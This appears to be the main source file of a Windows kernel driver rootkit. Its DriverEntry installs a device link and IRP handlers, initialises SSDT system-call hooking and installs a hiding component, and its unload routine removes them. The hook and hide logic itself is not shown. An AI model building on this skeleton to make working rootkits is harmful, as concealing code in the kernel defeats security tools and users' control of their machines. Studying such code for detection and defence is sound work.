#include <ntddk.h>

#include "hook/ssdt_utils.h"
#include "hide/hide_management.h"
#include "driver/device_and_slink.h"
#include "driver/irp_handling.h"
#include "dbgutils.h"


NTSTATUS __stdcall DriverEntry  ( IN PDRIVER_OBJECT  DriverObject,
                                  IN PUNICODE_STRING RegistryPath );
VOID     __stdcall DriverUnload ( IN PDRIVER_OBJECT  DriverObject );


NTSTATUS
__stdcall
DriverEntry(IN PDRIVER_OBJECT DriverObject,
            IN PUNICODE_STRING RegistryPath)
{
    DriverObject->DriverUnload = DriverUnload;

    if( !device_and_slink_install(DriverObject) )
    {
        DEBUG_PRINT("device_and_slink_install failed");
        return ( STATUS_SUCCESS );
    }

    if( !register_irp_handlers(DriverObject) )
    {
        DEBUG_PRINT("register_irp_handlers failed");
        return ( STATUS_SUCCESS );
    }

    if ( !ssdt_utils_init() )
    {
        DEBUG_PRINT("ssdt_utils_init failed\n");
        return ( 0 );
    }

    if( !hide_install() )
    {
        DEBUG_PRINT("hide_install failed\n");
        return ( STATUS_SUCCESS );
    }

    return ( STATUS_SUCCESS );
}

VOID
__stdcall
DriverUnload(IN PDRIVER_OBJECT DriverObject)
{
    if( !hide_remove() )
    {
        DEBUG_PRINT("hide_remove failed\n");
    }

    if( !device_and_slink_remove() )
    {
        DEBUG_PRINT("device_and_slink_remove failed");
    }
}
